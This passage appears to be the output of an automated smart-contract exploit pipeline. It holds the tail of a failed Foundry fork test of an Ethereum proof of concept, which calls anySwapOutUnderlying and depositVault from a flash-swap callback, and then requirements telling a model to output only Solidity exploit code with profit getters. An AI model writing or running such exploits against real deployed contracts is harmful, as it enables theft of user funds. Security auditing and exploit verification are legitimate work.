    │   │   └─ ← [Return] 0xe25b0BBA01Dc5630312B6A21927E578061A13f55
    │   ├─ [641] 0xe25b0BBA01Dc5630312B6A21927E578061A13f55::underlying() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [437] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14037236 [1.403e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xa035b9e130F2B1AedC733eEFb1C67Ba4c503491F.depositVault
  at 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643.depositVault
  at 0x6b7a87899490EcE95443e979cA9485CBE7E71522.anySwapOutUnderlying
  at FlawVerifier.uniswapV2Call
  at 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 460.27s (460.13s CPU time)

Ran 1 test suite in 460.51s (460.27s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 19100376)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
